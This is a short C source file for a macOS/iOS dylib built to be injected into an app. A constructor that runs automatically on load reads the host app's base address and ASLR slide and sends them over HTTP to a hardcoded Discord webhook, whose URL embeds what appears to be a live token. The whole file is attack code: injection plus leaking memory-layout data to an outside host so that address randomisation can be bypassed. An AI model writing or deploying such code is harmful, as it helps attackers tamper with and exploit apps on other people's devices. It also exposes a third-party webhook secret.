#include <stdio.h>
#include <mach-o/dyld.h>
#include <curl/curl.h>
#include <string.h>

// This function runs automatically when the dylib is injected
__attribute__((constructor))
static void init() {
    // 1. Get the Base Address and ASLR Slide of the main app (index 0)
    const struct mach_header_64* header = (struct mach_header_64*)_dyld_get_image_header(0);
    intptr_t slide = _dyld_get_image_vmaddr_slide(0);
    uintptr_t base_address = (uintptr_t)header;

    // 2. Format the message for Discord
    char json_payload[512];
    snprintf(json_payload, sizeof(json_payload), 
             "{\"content\": \"🚀 **Dylib Injected Successfully!**\\n**Base Address:** `0x%lx`\\n**ASLR Slide:** `0x%lx`\"}", 
             base_address, slide);

    // 3. Send via libcurl (built into iOS/macOS)
    CURL *curl = curl_easy_init();
    if(curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        
        curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1428780310451196048/Ps9b7xw3Tg1D5RPJka-AMg4Sfl_Elrw2bFO-Gvdgrhx-u8Aa9bxhjA2luPp9qhUvrehF");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
        
        // Execute the POST request
        curl_easy_perform(curl);
        
        // Clean up
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
}
